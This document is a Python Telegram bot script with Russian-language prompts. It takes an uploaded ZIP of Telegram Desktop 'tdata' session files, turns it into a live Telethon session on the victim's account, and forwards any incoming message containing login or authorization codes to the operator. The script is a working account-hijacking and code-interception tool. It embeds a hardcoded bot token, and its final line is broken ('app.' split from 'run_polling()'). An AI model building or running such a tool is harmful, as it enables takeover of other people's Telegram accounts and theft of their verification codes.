import os
import zipfile
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from opentele.tdata import TData
from telethon import events

BOT_TOKEN = "9104214570:AAHxFRfpwtxwhPMoUPG-c85dBjDRCjzBtOQ"
MY_ID = 8617048286

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_ID:
        return
    await update.message.reply_text("Привет! Отправь архив tdata.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_ID:
        return

    doc = update.message.document
    if not doc.file_name.endswith('.zip'):
        await update.message.reply_text("Нужен ZIP-архив!")
        return

    msg = await update.message.reply_text("Скачиваю...")
    
    zip_path = "user_tdata.zip"
    extract_dir = "extracted_tdata"
    
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive(zip_path)

    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(extract_dir)

    tdata_folder = extract_dir
    for root, dirs, files in os.walk(extract_dir):
        if "tdata" in dirs or "key_datas" in files:
            tdata_folder = root
            break

    try:
        found = False
        for r, d, fs in os.walk(extract_dir):
            if any("key_datas" in f for f in fs):
                tdata_folder = r
                found = True
                break
        
        if not found:
            await msg.edit_text("❌ Ошибка: В архиве не найдены файлы tdata (нет key_datas).")
            return

        td = TData(tdata_folder)
        client = await td.ToTelethon()
        await client.connect()
        
        await msg.edit_text("Сессия активна! Жду коды...")

        @client.on(events.NewMessage)
        async def catch_codes(event):
            text = event.raw_text.lower()
            if any(w in text for w in ["код", "code", "авторизац", "вход", "login"]):
                await context.bot.send_message(chat_id=MY_ID, text=f"Код:\n{event.raw_text}")

        asyncio.create_task(client.run_until_disconnected())

    except Exception as e:
        await msg.edit_text(f"Ошибка: {e}")

app = Application.builder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
app.
    run_polling()
